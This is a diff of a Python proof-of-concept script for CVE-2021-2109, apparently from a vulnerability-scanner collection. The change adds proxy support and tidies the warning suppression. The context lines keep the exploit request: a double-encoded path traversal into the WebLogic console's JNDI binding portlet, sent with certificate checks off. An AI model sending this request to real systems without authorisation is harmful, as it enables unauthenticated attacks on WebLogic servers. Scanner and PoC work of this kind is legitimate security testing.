@@ -3,10 +3,9 @@
 
 
 import requests
-from requests.packages.urllib3.exceptions import InsecurePlatformWarning
+from Config.config_proxies import proxies
 
-
-
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='CVE_2021_2109'
@@ -24,8 +23,8 @@ def poc(target):
     headers = {"UserAgent":"ua"}
     url = target + "/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle('{}/Basic/WeblogicEcho;AdminServer')".format(b)
     try:
-        requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
-        r = requests.get(url=url,headers=headers,verify=False,timeout=3)
+
+        r = requests.get(url=url,headers=headers,verify=False,timeout=3,proxies=proxies)
         if r.status_code == 200:
             result['target'] = target
             result['poc'] = NAME
